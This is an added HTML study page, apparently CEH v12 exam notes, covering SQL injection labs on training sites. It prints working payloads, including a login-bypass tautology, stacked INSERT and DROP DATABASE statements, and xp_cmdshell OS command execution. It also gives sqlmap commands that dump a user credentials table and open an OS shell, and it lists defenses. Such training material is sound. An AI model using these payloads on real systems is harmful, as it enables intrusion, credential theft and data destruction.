@@ -1,0 +1,437 @@
+<!DOCTYPE html>
+<html lang='en'>
+<head>
+    <meta charset='UTF-8'>
+    <meta name='viewport' content='width=device-width, initial-scale=1.0'>
+    <title>Module 15 - SQL Injection</title>
+    <link rel='stylesheet' href='style.css'>
+</head>
+<body>
+    <nav>
+        <h1>[MISSION_CONTROL]</h1>
+        <div class='search-wrap'>
+            <input id='globalSearch' type='text' placeholder='Search modules...'>
+            <div id='searchResults'></div>
+        </div>
+        <button class='nav-toggle' id='navToggle' aria-label='Toggle navigation' aria-expanded='false'>&#9776;</button>
+    <ul id='navMenu'>
+            <li><a href='index.html' id='nav-index'>ROOT_ROADMAP</a></li>
+            <li><a href='module_02.html' id='nav-02'>MOD_02_RECON</a></li>
+            <li><a href='module_03.html' id='nav-03'>MOD_03_SCAN</a></li>
+            <li><a href='module_04.html' id='nav-04'>MOD_04_ENUM</a></li>
+            <li><a href='module_05.html' id='nav-05'>MOD_05_VULN</a></li>
+            <li><a href='module_06.html' id='nav-06'>MOD_06_SYS</a></li>
+            <li><a href='module_07.html' id='nav-07'>MOD_07_MAL</a></li>
+            <li><a href='module_08.html' id='nav-08'>MOD_08_SNIFF</a></li>
+            <li><a href='module_09.html' id='nav-09'>MOD_09_SE</a></li>
+            <li><a href='module_10.html' id='nav-10'>MOD_10_DOS</a></li>
+            <li><a href='module_11.html' id='nav-11'>MOD_11_SESS</a></li>
+            <li><a href='module_12.html' id='nav-12'>MOD_12_EVADE</a></li>
+            <li><a href='module_13.html' id='nav-13'>MOD_13_WEBSRV</a></li>
+            <li><a href='module_14.html' id='nav-14'>MOD_14_WEBAPP</a></li>
+            <li><a href="module_15.html" id="nav-15">MOD_15_SQLI</a></li>
+            <li><a href='cheat_sheet.html' id='nav-cheat'>CHEAT_SHEET</a></li>
+        </ul>
+        <button id='viewToggle' class='view-toggle'>COMPACT</button>
+        <button id='themeToggle' class='theme-toggle'>SWITCH_MODE</button>
+    </nav>
+    <main class='content-body'>
+        <div class='window'>
+            <div class='module-header'>
+                <span>CEH v12 - Module 15</span>
+                <h2 class='hero-3d'>SQL Injection</h2>
+            </div>
+
+            <p>SQL injection is the most common and devastating attack that attackers can use to take control of data-driven web applications and websites. It is a code injection technique that exploits a security vulnerability in a website or application's software. SQL injection attacks use a series of malicious SQL (Structured Query Language) queries or statements to directly manipulate any type of SQL database. Applications often use SQL statements to authenticate users, validate roles and access levels, store, obtain information for the application and user, and link to other data sources. SQL injection attacks work when applications do not properly validate input before passing it to a SQL statement.</p>
+
+            <p><strong>Scenario:</strong> When attackers use tactics like SQL injection to compromise web applications and sites, the targeted organizations can incur huge losses in terms of money, reputation, and loss of data and functionality. As an ethical hacker or penetration tester (pen tester), you must possess sound knowledge of SQL injection techniques and be able to protect against them in diverse ways such as using prepared statements with bind parameters, whitelist input validation, and user-supplied input escaping. Input validation can be used to detect unauthorized input before it is passed to the SQL query. The labs in this module give hands-on experience in testing a web application against various SQL injection attacks.</p>
+
+            <p><strong>Objective:</strong> Perform SQL injection attacks and other tasks that include, but are not limited to: understanding when and how web applications connect to a database server in order to access data; performing a SQL injection attack on an MSSQL database; extracting basic SQL injection flaws and vulnerabilities; detecting SQL injection vulnerabilities.</p>
+
+            <p><strong>Overview of SQL Injection:</strong> SQL injection attacks can be performed using various techniques to view, manipulate, insert, and delete data from an application's database. There are three main types of SQL injection: in-band SQL injection (an attacker uses the same communication channel to perform the attack and retrieve the results), blind/inferential SQL injection (an attacker has no error messages from the system to work with, but sends a malicious SQL query to the database), and out-of-band SQL injection (an attacker uses different communication channels such as database email functionality, or file writing and loading functions to perform the attack and obtain the results).</p>
+
+            <p><strong>Lab Tasks:</strong></p>
+            <ul>
+                <li>Perform SQL injection attacks
+                    <ul>
+                        <li>Perform an SQL injection attack on an MSSQL database</li>
+                        <li>Perform an SQL injection attack against MSSQL to extract databases using sqlmap</li>
+                    </ul>
+                </li>
+                <li>Detect SQL injection vulnerabilities using various SQL injection detection tools
+                    <ul>
+                        <li>Detect SQL injection vulnerabilities using DSSS</li>
+                        <li>Detect SQL injection vulnerabilities using OWASP ZAP</li>
+                    </ul>
+                </li>
+            </ul>
+
+            <section class='lab-task'>
+                <h3>Exam Essentials: SQL Injection</h3>
+                <div class='section-card'>
+                    <span class='tool-tag'>Scenario &amp; Objective</span>
+                    <p><strong>Scenario:</strong> SQL injection is the most common and devastating attack used to take control of data-driven web applications and websites. It is a code injection technique exploiting a security vulnerability in an application's software, using malicious SQL queries to manipulate databases. Applications use SQL statements to authenticate users, validate roles, store/obtain information, and link data sources. SQL injection works when applications do not properly validate input before passing it to a SQL statement. Targeted organizations can incur huge losses in money, reputation, data, and functionality. As a pen tester you must know SQL injection techniques and protect against them using prepared statements with bind parameters, whitelist input validation, and user-supplied input escaping.</p>
+                    <p><strong>Objective:</strong> Understand when and how web applications connect to a database server to access data; perform a SQL injection attack on an MSSQL database; extract SQL injection flaws and vulnerabilities; detect SQL injection vulnerabilities.</p>
+                </div>
+                <div class='section-card'>
+                    <span class='tool-tag'>Overview of SQL Injection</span>
+                    <p>SQL injection can be used to implement: authentication bypass (log on without valid credentials, gain admin privileges), authorization bypass (alter authorization info in the DB), information disclosure (obtain sensitive stored data), compromised data integrity (deface pages, insert malicious content, alter DB contents), compromised availability of data (delete specific info, logs, audit trails), and remote code execution (execute code remotely, compromise the host OS). There are three main types: in-band (same channel for attack and results), blind/inferential (no error messages; send malicious query and infer from true/false or timing), and out-of-band (different channels such as DB email, file read/write).</p>
+                </div>
+                <div class='section-card'>
+                    <span class='tool-tag'>Key Concepts</span>
+                    <ul>
+                        <li><strong>SQL Injection:</strong> Code injection exploiting unsanitized user input in SQL statements; manipulates database queries to view, insert, update, or delete data.</li>
+                        <li><strong>In-band SQLi:</strong> Attacker uses the same communication channel to perform the attack and retrieve results. Includes error-based and union-based.</li>
+                        <li><strong>Error-based SQLi:</strong> Database error messages reveal structure, table names, or data; attacker forces errors to extract information.</li>
+                        <li><strong>Union-based SQLi:</strong> Uses UNION SELECT to append attacker-controlled results to the original query output.</li>
+                        <li><strong>Blind / Inferential SQLi:</strong> No visible output or errors; attacker poses true/false questions to the DB. Subtypes: boolean-based (page content differs) and time-based (response delays via WAITFOR DELAY / SLEEP).</li>
+                        <li><strong>Out-of-band SQLi:</strong> Uses different channels (DNS, HTTP, email, file system) to exfiltrate data when in-band is not possible.</li>
+                        <li><strong>Tautology:</strong> An always-true condition such as <code>blah' or 1=1 --</code> used to bypass authentication.</li>
+                        <li><strong>Piggybacking (stacked queries):</strong> Appending additional SQL statements separated by <code>;</code> (INSERT, CREATE, DROP, EXEC) to the original query.</li>
+                        <li><strong>Stored Procedures:</strong> Database routines that can be abused, e.g. <code>xp_cmdshell</code> to execute OS commands on MSSQL.</li>
+                        <li><strong>Comment syntax:</strong> <code>--</code> comments out the remainder of the SQL query, neutralizing trailing conditions.</li>
+                        <li><strong>sqlmap:</strong> Open-source automated tool for detecting/exploiting SQLi; supports boolean-based blind, time-based blind, error-based, UNION, stacked, and out-of-band techniques. Switches: <code>--dbs</code>, <code>-D db --tables</code>, <code>-D db -T table --dump</code>, <code>--os-shell</code>.</li>
+                        <li><strong>DSSS (Damn Small SQLi Scanner):</strong> Fully functional SQLi scanner supporting GET and POST parameters; detects blind SQLi and prints vulnerable links.</li>
+                        <li><strong>OWASP ZAP:</strong> Integrated pen-testing tool; Automated Scan; Alerts tab shows vulnerabilities with Risk/Confidence/Parameter/Attack; risk flags by color.</li>
+                        <li><strong>Burp Suite:</strong> Proxy/interceptor used to tamper with parameters and test SQLi manually.</li>
+                        <li><strong>MSSQL targets:</strong> GoodShopping (login table smith/smith123), MovieScope (User_Login table with plaintext passwords).</li>
+                        <li><strong>Cookie-based scanning:</strong> Authenticated sqlmap/DSSS scans require the session cookie from the logged-in browser.</li>
+                    </ul>
+                </div>
+                <div class='section-card'>
+                    <span class='tool-tag'>Tools</span>
+                    <p><span class='tool-tag'>sqlmap</span> <span class='tool-tag'>DSSS</span> <span class='tool-tag'>OWASP ZAP</span> <span class='tool-tag'>Burp Suite</span> <span class='tool-tag'>Microsoft SQL Server Management Studio</span> <span class='tool-tag'>Firefox</span> <span class='tool-tag'>Parrot Security</span> <span class='tool-tag'>Windows 11</span> <span class='tool-tag'>Windows Server 2019</span> <span class='tool-tag'>MSSQL</span></p>
+                </div>
+                <div class='section-card'>
+                    <span class='tool-tag'>Key Payloads</span>
+                    <pre><code># Authentication bypass (tautology)
+blah' or 1=1 --
+
+# Insert a new user (piggybacking)
+blah';insert into login values ('john','apple123'); --
+
+# Create a database
+blah';create database mydatabase; --
+
+# Drop a database / table
+blah'; DROP DATABASE mydatabase; --
+blah'; DROP TABLE table_name; --
+
+# OS command execution via xp_cmdshell
+blah';exec master..xp_cmdshell 'ping www.certifiedhacker.com -l 65000 -t'; --
+
+# sqlmap: enumerate DBs, tables, dump, OS shell
+sqlmap -u 'http://www.moviescope.com/viewprofile.aspx?id=1' --cookie='[cookie]' --dbs
+sqlmap -u 'http://www.moviescope.com/viewprofile.aspx?id=1' --cookie='[cookie]' -D moviescope --tables
+sqlmap -u 'http://www.moviescope.com/viewprofile.aspx?id=1' --cookie='[cookie]' -D moviescope -T User_Login --dump
+sqlmap -u 'http://www.moviescope.com/viewprofile.aspx?id=1' --cookie='[cookie]' --os-shell
+
+# DSSS: list options / scan
+python3 dsss.py
+python3 dsss.py -u 'http://www.moviescope.com/viewprofile.aspx?id=1' --cookie='[cookie]'
+
+# OWASP ZAP
+# Automated Scan URL: http://www.moviescope.com  (Alerts tab -> SQL Injection node)</code></pre>
+                </div>
+                <div class='section-card'>
+                    <span class='tool-tag'>Defenses</span>
+                    <ul>
+                        <li>Use parameterized queries / prepared statements with bind parameters instead of string concatenation.</li>
+                        <li>Whitelist input validation and strong typing; reject unexpected characters.</li>
+                        <li>Escape user-supplied input where dynamic SQL is unavoidable.</li>
+                        <li>Apply least privilege to DB accounts; disable <code>xp_cmdshell</code> and dangerous stored procedures.</li>
+                        <li>Suppress verbose database errors; return generic messages to users.</li>
+                        <li>Deploy WAF/IDS/IPS and monitor for SQLi patterns.</li>
+                        <li>Avoid dynamic SQL in stored procedures; use parameterized calls.</li>
+                    </ul>
+                </div>
+                <div class='section-card'>
+                    <span class='tool-tag'>Exam Tips</span>
+                    <ul>
+                        <li>Tautology payload <code>blah' or 1=1 --</code> bypasses login when input is not validated.</li>
+                        <li>Piggybacking uses <code>;</code> to stack extra statements (INSERT/CREATE/DROP/EXEC).</li>
+                        <li><code>--</code> comments out the rest of the query, neutralizing trailing WHERE/AND conditions.</li>
+                        <li><code>xp_cmdshell</code> lets SQLi execute OS commands on MSSQL (ping, tasklist, net user).</li>
+                        <li>sqlmap: <code>--dbs</code> lists DBs, <code>-D db --tables</code> lists tables, <code>-D db -T table --dump</code> dumps rows, <code>--os-shell</code> gives interactive OS shell.</li>
+                        <li>DSSS detects blind SQLi and prints a vulnerable link that, when opened, reveals user accounts.</li>
+                        <li>OWASP ZAP: Alerts tab; expand SQL Injection node; view Risk, Confidence, Parameter, Attack; risk flags Red=High, Orange=Medium, Yellow=Low, Blue=Info.</li>
+                        <li>Blind SQLi relies on true/false questions and can be time-intensive.</li>
+                        <li>Out-of-band SQLi uses different channels (DNS/HTTP/email/file) to exfiltrate data.</li>
+                        <li>Authenticated scans (sqlmap/DSSS) need the session cookie copied from browser DevTools Console (<code>document.cookie</code>).</li>
+                        <li>Extracted passwords may be stored in plaintext (MovieScope User_Login).</li>
+                        <li>After injection, verify results in SSMS (Select Top 1000 Rows) or by logging in with extracted creds.</li>
+                    </ul>
+                </div>
+                <div class='section-card'>
+                    <p><strong>Notes:</strong> Versions/website appearance may differ; process same. Always obtain proper authorization; use these techniques only in authorized labs/environments.</p>
+                </div>
+            </section>
+
+            <section class='lab-task'>
+                <h3>Lab 1: Perform SQL Injection Attacks - Task 1: Perform an SQL Injection Attack on an MSSQL Database</h3>
+                <div class='section-card'>
+                    <span class='tool-tag'>MSSQL / SSMS / Firefox / Windows 11 / Windows Server 2019 / GoodShopping</span>
+                    <p><strong>What/when:</strong> SQL injection attack on an MSSQL database (GoodShopping website). Victim machine is Windows Server 2019 hosting the site; attacker uses Windows 11. Demonstrates authentication bypass (tautology), piggybacked INSERT to create a user, CREATE/DROP DATABASE, and OS command execution via xp_cmdshell. Login to Windows 11 as Admin/Pa$$w0rd; Networks Yes. Login to Windows Server 2019 as Administrator/Pa$$w0rd when switching.</p>
+                    <pre><code># Windows 11 machine
+# login: Admin / Pa$$w0rd ; Networks: Yes
+# open Mozilla Firefox
+# address bar:
+http://www.goodshopping.com/
+# GOOD SHOPPING home page loads
+# click LOGIN on menu bar
+
+# Authentication bypass (tautology): leave password empty
+Username: blah' or 1=1 --
+# click Log in -> logged in with fake login; browse; click Logout
+
+# Switch to Windows Server 2019 (victim)
+# login: Administrator / Pa$$w0rd ; Networks: Yes
+# Type here to search -> microsoft -> Microsoft SQL Server Management Studio 18
+# Connect to Server pop-up: leave defaults -> Connect
+# Object Explorer: expand Databases -> GoodShopping -> Tables
+# right-click dbo.Login -> Select Top 1000 Rows
+# observe single entry: username smith, password smith123
+
+# Switch back to Windows 11; browser GOOD SHOPPING open
+# LOGIN on menu bar
+# Create a new user via piggybacked INSERT (leave password empty)
+Username: blah';insert into login values ('john','apple123'); --
+# click Log in -> no error => success
+# verify: LOGIN tab -> Username john, Password apple123 -> Log in -> success
+# browse; click Logout
+
+# Switch to Windows Server 2019; SSMS
+# right-click dbo.Login -> Select Top 1000 Rows
+# observe new entry: john / apple123
+
+# Switch to Windows 11; browser GOOD SHOPPING open
+# LOGIN on menu bar
+# Create a database (leave password empty)
+Username: blah';create database mydatabase; --
+# click Log in -> no error => mydatabase created
+
+# Switch to Windows Server 2019; SSMS
+# click Disconnect icon, then Connect Object Explorer; Connect
+# expand Databases -> observe mydatabase
+
+# Switch to Windows 11; browser GOOD SHOPPING open
+# LOGIN on menu bar
+# Drop the database (leave password empty)
+Username: blah'; DROP DATABASE mydatabase; --
+# click Log in
+
+# Switch to Windows Server 2019; SSMS
+# click Refresh icon; expand Databases -> mydatabase gone
+# (same technique: blah'; DROP TABLE table_name; -- to drop a table)
+
+# Switch to Windows 11; browser GOOD SHOPPING open
+# LOGIN on menu bar
+# OS command execution via xp_cmdshell (leave password empty)
+Username: blah';exec master..xp_cmdshell 'ping www.certifiedhacker.com -l 65000 -t'; --
+# click Log in -> page shows 'Waiting for www.goodshopping.com...'
+# Switch to Windows Server 2019
+# right-click Start -> Task Manager -> More details
+# Details tab -> type p -> observe PING.EXE running
+# select PING.EXE -> End task (End process if prompted)
+# close all windows; document findings</code></pre>
+                    <p><strong>Key procedural steps / narrative:</strong> Windows 11 login Admin/Pa$$w0rd, Networks Yes. Open Firefox to GoodShopping; click LOGIN. Enter tautology payload <code>blah' or 1=1 --</code> in Username, empty password; Log in; browse; Logout. Switch to Windows Server 2019; login Administrator/Pa$$w0rd; launch SSMS; Connect. Expand Databases/GoodShopping/Tables; Select Top 1000 Rows on dbo.Login; observe smith/smith123. Switch to Windows 11; LOGIN; enter <code>blah';insert into login values ('john','apple123'); --</code>; Log in; no error. Verify by logging in as john/apple123. Switch to Windows Server 2019; Select Top 1000 Rows; observe john/apple123. Switch to Windows 11; enter <code>blah';create database mydatabase; --</code>; Log in. Switch to Windows Server 2019; reconnect Object Explorer; expand Databases; observe mydatabase. Switch to Windows 11; enter <code>blah'; DROP DATABASE mydatabase; --</code>; Log in. Switch to Windows Server 2019; Refresh; observe mydatabase deleted. Switch to Windows 11; enter xp_cmdshell ping payload; Log in. Switch to Windows Server 2019; Task Manager -> Details -> type p -> observe PING.EXE; End task. Close all windows; document findings.</p>
+                    <p><strong>Notes:</strong> Versions/website appearance may differ; process same. <code>blah'; DROP TABLE table_name; --</code> would delete a table. Use these techniques only in authorized labs.</p>
+                </div>
+            </section>
+
+            <section class='lab-task'>
+                <h3>Lab 1: Perform SQL Injection Attacks - Task 2: Perform an SQL Injection Attack Against MSSQL to Extract Databases using sqlmap</h3>
+                <div class='section-card'>
+                    <span class='tool-tag'>sqlmap / Firefox / Parrot Security / Windows Server 2019 (MovieScope) / MSSQL</span>
+                    <p><strong>What/when:</strong> Use sqlmap to perform SQL injection against MSSQL (MovieScope website) to extract databases. Pretend to be registered user sam/test on http://www.moviescope.com; crack other users' passwords from the DB. Attacker on Parrot Security. Captures session cookie for authenticated scan.</p>
+                    <pre><code># Parrot Security machine
+# login: attacker / toor
+# (if update prompt appears, click No)
+
+# Firefox: http://www.moviescope.com/
+# Login: Username sam, Password test -> Login
+# (if save login prompt, click Don't Save)
+# View Profile tab -> note URL in address bar (viewprofile.aspx?id=1)
+# Right-click page -> Inspect Element (Q)
+# Developer Tools -> Console tab
+document.cookie
+# select and copy the cookie value; minimize browser
+
+# MATE Terminal
+sudo su
+# password: toor (not visible)
+# root prompt
+
+# Enumerate databases (answer prompts with Y)
+sqlmap -u 'http://www.moviescope.com/viewprofile.aspx?id=1' --cookie='[cookie value copied]' --dbs
+# -u target URL; --cookie HTTP cookie header; --dbs enumerate DBMS databases
+# prompts: 'skip test payloads for other DBMSes?' Y; 'include all tests for MSSQL?' Y
+
+# Enumerate tables in moviescope DB
+sqlmap -u 'http://www.moviescope.com/viewprofile.aspx?id=1' --cookie='[cookie value]' -D moviescope --tables
+# -D DBMS database; --tables enumerate tables
+
+# Dump User_Login table
+sqlmap -u 'http://www.moviescope.com/viewprofile.aspx?id=1' --cookie='[cookie value]' -D moviescope -T User_Login --dump
+# -T table; --dump dump all rows (usernames under Uname, passwords plaintext)
+
+# Verify extracted creds: switch to Firefox; close DevTools; Logout; new session
+# Login with john / qwerty -> logged in as john
+
+# OS shell
+sqlmap -u 'http://www.moviescope.com/viewprofile.aspx?id=1' --cookie='[cookie value]' --os-shell
+# --os-shell interactive OS shell
+# if optimize delay prompt appears: Y
+hostname
+# if 'retrieve command standard output?' prompt: Y -> machine name
+TASKLIST
+# if prompt: Y -> running tasks
+help
+# list available OS shell commands
+# close all windows; document findings</code></pre>
+                    <p><strong>Key procedural steps / narrative:</strong> Parrot Security login attacker/toor. Firefox to MovieScope; login sam/test. View Profile; note URL. Inspect Element -> Console; run document.cookie; copy cookie value; minimize browser. MATE Terminal; sudo su; toor. Run sqlmap with --dbs against viewprofile.aspx?id=1 with cookie; answer prompts Y. Run sqlmap -D moviescope --tables. Run sqlmap -D moviescope -T User_Login --dump; observe plaintext passwords. Verify by logging in as john/qwerty. Run sqlmap --os-shell; hostname, TASKLIST, help. Close windows; document findings.</p>
+                    <p><strong>Notes:</strong> Versions/website appearance may differ; process same. Other SQLi tools: Mole, Blisqy, blind-sql-bitshifting, NoSQLMap.</p>
+                </div>
+            </section>
+
+            <section class='lab-task'>
+                <h3>Lab 2: Detect SQL Injection Vulnerabilities using Various SQL Injection Detection Tools - Task 1: Detect SQL Injection Vulnerabilities using DSSS</h3>
+                <div class='section-card'>
+                    <span class='tool-tag'>DSSS / Parrot Security / Windows Server 2019 (MovieScope) / Python3</span>
+                    <p><strong>What/when:</strong> Damn Small SQLi Scanner (DSSS) detects SQL injection vulnerabilities (GET/POST params). Scans www.moviescope.com hosted on Windows Server 2019. Attacker on Parrot Security. Captures session cookie; scan reveals blind SQLi and a vulnerable link that exposes user accounts.</p>
+                    <pre><code># Parrot Security machine
+# MATE Terminal
+sudo su
+# password: toor
+cd DSSS
+python3 dsss.py
+# lists available options
+
+# Firefox: http://www.moviescope.com/
+# Login: sam / test -> Login (Don't Save if prompted)
+# View Profile tab -> note URL
+# Right-click page -> Inspect Element (Q)
+# Developer Tools -> Console -> document.cookie -> copy cookie value; minimize browser
+
+# Terminal
+python3 dsss.py -u 'http://www.moviescope.com/viewprofile.aspx?id=1' --cookie='[cookie value copied]'
+# -u target URL; --cookie HTTP cookie header
+# result: target vulnerable to blind SQL injection; vulnerable link displayed
+# highlight vulnerable link -> right-click -> Copy
+
+# Firefox: new tab -> paste copied link -> Enter
+# observe user account info under View Profile (all users)
+# scroll down to view all accounts
+# close all windows; document findings</code></pre>
+                    <p><strong>Key procedural steps / narrative:</strong> Parrot Security terminal; sudo su; toor. cd DSSS. Run python3 dsss.py to list options. Firefox login sam/test; View Profile; note URL. Inspect Element -> Console; document.cookie; copy cookie; minimize browser. Terminal: run DSSS with -u and --cookie. Result shows blind SQLi vulnerability and vulnerable link. Copy link; open in Firefox; observe all user accounts. Close windows; document findings.</p>
+                    <p><strong>Notes:</strong> Versions/website appearance may differ; process same. In real life, attackers use blind SQLi to access/destroy sensitive data by asking true/false questions; time-intensive.</p>
+                </div>
+            </section>
+
+            <section class='lab-task'>
+                <h3>Lab 2: Detect SQL Injection Vulnerabilities using Various SQL Injection Detection Tools - Task 2: Detect SQL Injection Vulnerabilities using OWASP ZAP</h3>
+                <div class='section-card'>
+                    <span class='tool-tag'>OWASP ZAP / Windows Server 2019 (MovieScope) / SQL Injection</span>
+                    <p><strong>What/when:</strong> Use OWASP ZAP to test www.moviescope.com (hosted on Windows Server 2019) for SQL injection vulnerabilities. Automated Scan; review Alerts tab. Risk flags: Red=High, Orange=Medium, Yellow=Low, Blue=Info.</p>
+                    <pre><code># Windows Server 2019 machine
+# if logged out: Ctrl+Alt+Delete -> login Administrator / Pa$$w0rd
+
+# Type here to search -> type zap -> Zap 2.11.1 -> Enter
+# OWASP ZAP init prompt: 'Do you want to persist ZAP Session?'
+# select 'No, I do not want to persist this session at this moment in time' -> Start
+# (if Manage Add-ons window appears, close it)
+# (if alert pop-ups appear, click OK)
+
+# Main window -> Quick Start tab -> Automated Scan
+# URL to attack: http://www.moviescope.com
+# leave other options default -> Attack
+# OWASP ZAP performs Active Scan
+
+# After scan completes -> Alerts tab
+# observe vulnerabilities found
+# expand SQL Injection vulnerability node
+# (if not visible, re-run/adjust scan)
+# click discovered SQL Injection -> click vulnerable URL
+# observe Risk, Confidence, Parameter, Attack details (lower right)
+# risk flags: Red=High, Orange=Medium, Yellow=Low, Blue=Info
+# close all windows; document findings</code></pre>
+                    <p><strong>Key procedural steps / narrative:</strong> Switch to Windows Server 2019; login Administrator/Pa$$w0rd if needed. Search zap; launch Zap 2.11.1. On persist session prompt select No persist; Start; close Manage Add-ons. Quick Start -> Automated Scan; enter http://www.moviescope.com in URL to attack; click Attack. After scan, Alerts tab lists vulnerabilities. Expand SQL Injection node; click vulnerability and vulnerable URL; observe Risk/Confidence/Parameter/Attack. Risk flags by color. Close windows; document findings.</p>
+                    <p><strong>Notes:</strong> Versions/website appearance may differ; process same. Other SQLi detection tools: Acunetix, Snort, Burp Suite, w3af.</p>
+                </div>
+            </section>
+
+            <section class='lab-task'>
+                <h3>Practice &amp; Reference</h3>
+                <div class='section-card'>
+                    <p>The lab tasks above provide hands-on practice and reference commands for SQL injection attacks and detection (MSSQL tautology/piggybacking/xp_cmdshell, sqlmap extraction and OS shell, DSSS blind SQLi detection, OWASP ZAP automated scan).</p>
+                </div>
+            </section>
+        </div>
+    </main>
+    <script>
+        const body = document.body;
+        const applyTheme = (t) => {
+            if (t === 'dark') body.setAttribute('data-theme', 'dark');
+            else body.removeAttribute('data-theme');
+        };
+        function getTheme() {
+            try {
+                const p = new URLSearchParams(location.search);
+                const u = p.get('theme');
+                if (u === 'dark' || u === 'light') return u;
+            } catch (e) {}
+            try { return localStorage.getItem('theme') || 'light'; } catch (e) { return 'light'; }
+        }
+        function syncNavLinks(t) {
+            document.querySelectorAll('a[href]').forEach(a => {
+                try {
+                    const url = new URL(a.getAttribute('href'), location.href);
+                    if (url.pathname.endsWith('.html')) {
+                        url.searchParams.set('theme', t);
+                        a.setAttribute('href', url.pathname.split('/').pop() + '?' + url.searchParams.toString());
+                    }
+                } catch (e) {}
+            });
+        }
+        const initialTheme = getTheme();
+        applyTheme(initialTheme);
+        syncNavLinks(initialTheme);
+        const toggle = document.getElementById('themeToggle');
+        if (toggle) {
+            toggle.addEventListener('click', () => {
+                const newT = body.hasAttribute('data-theme') ? 'light' : 'dark';
+                applyTheme(newT);
+                try { localStorage.setItem('theme', newT); } catch (e) {}
+                try {
+                    const url = new URL(location.href);
+                    url.searchParams.set('theme', newT);
+                    history.replaceState(null, '', url.toString());
+                } catch (e) {}
+                syncNavLinks(newT);
+            });
+        }
+        const path = window.location.pathname.split('/').pop();
+        const navMap = {
+            'index.html': 'nav-index',
+            'module_02.html': 'nav-02',
+            'module_03.html': 'nav-03',
+            'module_04.html': 'nav-04',
+            'module_05.html': 'nav-05',
+            'module_06.html': 'nav-06',
+            'module_07.html': 'nav-07',
+            'module_08.html': 'nav-08',
+            'module_09.html': 'nav-09',
+            'module_10.html': 'nav-10',
+            'module_11.html': 'nav-11',
+            'module_12.html': 'nav-12',
+            'module_13.html': 'nav-13',
+            'module_14.html': 'nav-14',
+            'module_15.html': 'nav-15',
+            'cheat_sheet.html': 'nav-cheat'
+        };
+        const navId = navMap[path] || 'nav-index';
+        document.getElementById(navId).classList.add('active');
+    </script>
+    <script src='app.js'></script>
+</body>
+</html>
